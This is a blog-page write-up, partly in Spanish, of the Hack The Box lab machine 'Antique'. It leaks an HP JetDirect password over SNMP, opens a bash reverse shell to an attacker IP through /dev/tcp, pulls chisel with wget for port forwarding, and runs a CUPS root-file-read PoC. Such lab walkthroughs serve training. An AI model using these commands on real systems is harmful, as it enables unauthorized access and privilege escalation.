<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-antique-writeup">Hack The Box: Antique Writeup</h1>
<p>Welcome to my detailed writeup of the easy difficulty machine <strong>&ldquo;Antique&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.250.207 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.250.207 -&gt; <span style="color:#f92672">[</span>23<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p23 10.129.250.207 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 23:18 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.250.207
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>23/tcp open  telnet
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.12 seconds
</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> --min-rate <span style="color:#ae81ff">5000</span> -sU -n -Pn 10.129.250.207 -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 23:19 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.250.207
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1494</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>88/udp    closed kerberos-sec
</span></span><span style="display:flex;"><span>161/udp   open   snmp
</span></span><span style="display:flex;"><span>19933/udp closed unknown
</span></span><span style="display:flex;"><span>25212/udp closed unknown
</span></span><span style="display:flex;"><span>27673/udp closed unknown
</span></span><span style="display:flex;"><span>30661/udp closed unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.82 seconds
</span></span></code></pre></div><p>La verdad que me sorprendió solo ver el telnet abierto por TCP..</p>
<h1 id="snmp-enumeration">SNMP Enumeration</h1>
<p>Como tampoco podía hacer mucho, voy a enumerar con <code>snmpbulkwalk</code> a ver que se está compartiendo por SNMP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ snmpbulkwalk -c public -v2c 10.129.250.207
</span></span><span style="display:flex;"><span>SNMPv2-SMI::mib-2 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;HTB Printer&#34;</span>
</span></span></code></pre></div><p>Así que decidí conectarme por telnet, a ver si conseguía algo mas de información.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ telnet 10.129.250.207
</span></span><span style="display:flex;"><span>Trying 10.129.250.207...
</span></span><span style="display:flex;"><span>Connected to 10.129.250.207.
</span></span><span style="display:flex;"><span>Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HP JetDirect
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password: admin
</span></span><span style="display:flex;"><span>Invalid password
</span></span><span style="display:flex;"><span>Connection closed by foreign host.
</span></span></code></pre></div><p>HP JetDirect, algo es algo&hellip;</p>
<p><img src="images/Screenshot_1.png" alt="Write-up Image">
Buscando con <code>searchsploit</code> vemos lo siguiente&hellip;</p>
<pre tabindex="0"><code>A problem with JetDirect printers could make it possible for a remote user to gain administrative access to the printer.

It has been reported that HP JetDirect printers leak the web JetAdmin device password under some circumstances. By sending an SNMP GET request to a vulnerable printer, the printer will return the hex-encoded device password to the requester. This could allow a remote user to access and change configuration of the printer.

C:\&gt;snmputil get example.printer public .1.3.6.1.4.1.11.2.3.9.1.1.13.0
</code></pre><p>Probando con el OID que nos ha compartido..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ snmpwalk -c public -v2c 10.129.250.207 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
</span></span><span style="display:flex;"><span>SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 <span style="color:#f92672">=</span> BITS: <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">32</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">33</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">9</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">26</span> <span style="color:#ae81ff">27</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">49</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">54</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">82</span> <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">86</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">91</span> <span style="color:#ae81ff">94</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">103</span> <span style="color:#ae81ff">106</span> <span style="color:#ae81ff">111</span> <span style="color:#ae81ff">114</span> <span style="color:#ae81ff">115</span> <span style="color:#ae81ff">119</span> <span style="color:#ae81ff">122</span> <span style="color:#ae81ff">123</span> <span style="color:#ae81ff">126</span> <span style="color:#ae81ff">130</span> <span style="color:#ae81ff">131</span> <span style="color:#ae81ff">134</span> <span style="color:#ae81ff">135</span>
</span></span></code></pre></div><p>¡Nos responde algo!</p>
<h1 id="foothold">Foothold</h1>
<p>Como dato, el CVE es <a href="https://vuldb.com/?source_cve.18962" title="Cve">CVE-2002-1048</a>
Del año de la polka&hellip;</p>
<p>Con un pequeño script en python</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>BITS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode</span>():
</span></span><span style="display:flex;"><span>    bits <span style="color:#f92672">=</span> BITS<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>    result_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([chr(int(bits[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(bits), <span style="color:#ae81ff">2</span>)])
</span></span><span style="display:flex;"><span>    print(result_string)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    decode(
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 decode.py 
</span></span><span style="display:flex;"><span>P@ssw0rd@123!!123q<span style="color:#e6db74">&#34;2Rbs3CSs</span>$4<span style="color:#e6db74">EuWGWaA&#34;</span>1&amp;1A5
</span></span></code></pre></div><p>Me dio la sensación de que se habían colado caracteres, por lo cual me quedé solo con la primera fila de hexadecimal
<code>50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32</code></p>
<p>Y ahora tiene mejor pinta.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 decode.py 
</span></span><span style="display:flex;"><span>P@ssw0rd@123!!12
</span></span></code></pre></div><p>Probando combinaciones, vi que faltaba un tres en la contraseña.
<code>P@ssw0rd@123!!123</code>
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Enumerando lo que podía hacer, nos encontramos esta línea
<code>exec: execute system commands (exec id)</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>exec id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>7<span style="color:#f92672">(</span>lp<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>7<span style="color:#f92672">(</span>lp<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>7<span style="color:#f92672">(</span>lp<span style="color:#f92672">)</span>,19<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Ahora solo queda mandarnos una reverse shell.</p>
<p>Nos ponemos en escucha con <code>netcat</code> por el puerto 443.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span></code></pre></div><p>Nos mandamos la revshell&hellip;</p>
<pre tabindex="0"><code>&gt; exec bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.18/443 0&gt;&amp;1&#34;
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.18<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.250.207<span style="color:#f92672">]</span> <span style="color:#ae81ff">56774</span>
</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1146<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
</span></span><span style="display:flex;"><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span>lp@antique:~$ whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>lp
</span></span><span style="display:flex;"><span>lp@antique:~$ 
</span></span></code></pre></div><p>Y ya podríamos leer la flag de usuario</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lp@antique:~$ cat user.txt
</span></span><span style="display:flex;"><span>cat user.txt
</span></span><span style="display:flex;"><span>1639908b7ad1cd...
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Después de enumerar un rato el sistema.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lp@antique:~$ netstat -tulnp
</span></span><span style="display:flex;"><span>netstat -tulnp
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
</span></span><span style="display:flex;"><span> will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:23              0.0.0.0:*               LISTEN      1163/python3        
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> ::1:631                 :::*                    LISTEN      -                   
</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:68              0.0.0.0:*                           -                   
</span></span><span style="display:flex;"><span>udp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:161             0.0.0.0:*                           -         
</span></span></code></pre></div><p>Vemos un puerto interno 631.</p>
<p>Vamos con <code>chisel</code> a hacer Reverse Port Forwarding</p>
<p>Nos lo compartimos creando un servidor web temporal con <code>python3</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
</span></span></code></pre></div><p>Y nos lo descargamos en la máquina víctima con <code>wget</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lp@antique:/tmp$ wget http://10.10.14.18:8081/chisel
</span></span></code></pre></div><p>En la máquina víctima nos ponemos en escucha por el puerto 1234.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo ./chisel server --reverse -p <span style="color:#ae81ff">1234</span>
</span></span></code></pre></div><p><strong>Importante ejecutar con <code>sudo</code> ya que se va a usar un puerto inferior a 1024.</strong></p>
<p>Ahora en la máquina víctima..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./chisel client 10.10.14.18:1234 R:631:127.0.0.1:631
</span></span></code></pre></div><p>Y ahora nuestro puerto local 631 es el puerto 631 de la máquina víctima.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo ./chisel server --reverse -p <span style="color:#ae81ff">1234</span>
</span></span><span style="display:flex;"><span>2024/08/05 23:47:39 server: Reverse tunnelling enabled
</span></span><span style="display:flex;"><span>2024/08/05 23:47:39 server: Fingerprint NlttnPRHpMQoAwbRWuNr/L0LOxmCqUuczmy3ifi7RMU<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>2024/08/05 23:47:39 server: Listening on http://0.0.0.0:1234
</span></span><span style="display:flex;"><span>2024/08/05 23:47:40 server: session#1: tun: proxy#R:631<span style="color:#f92672">=</span>&gt;631: Listening
</span></span></code></pre></div><p>Haciendo una simple enumeración con <code>nmap</code> vemos que es un servicio CUPS 1.6.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p631 -sCV 127.0.0.1
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 23:49 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00019s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>631/tcp open  ipp     CUPS 1.6
</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
</span></span><span style="display:flex;"><span>|_/
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: PUT
</span></span><span style="display:flex;"><span>|_http-server-header: CUPS/1.6
</span></span><span style="display:flex;"><span>|_http-title: Home - CUPS 1.6.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.23 seconds
</span></span></code></pre></div><p>Así se ve.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Y vemos una vulnerabilidad de tipo RCE que puede que sea compatible con esta versión.
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Necesito python2 para este exploit y no lo tengo instalado en mi máquina, así que vamos a buscar una forma alternativa..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 rce.py 
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/pointedsec/Desktop/antique/content/rce.py&#34;</span>, line <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ^^^^^^^^^
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SyntaxError: Missing parentheses in call to &#39;</span>print<span style="color:#960050;background-color:#1e0010">&#39;</span>. Did you mean print<span style="color:#f92672">(</span>...<span style="color:#f92672">)</span>?
</span></span></code></pre></div><p>Parece ser que podemos ejecutar directamente este <a href="https://github.com/p1ckzi/CVE-2012-5519">PoC</a> desde la máquina víctima si estamos en el grupo <code>lpadmin</code></p>
<p>Así que vamos a compartirnoslo.</p>
<p>Y si le damos permiso de ejecución y lo ejecutamos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lp@antique:/tmp$ ./cups-root-file-read.sh
</span></span></code></pre></div><p>Y podemos leer archivos privilegiados de la máquina.
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
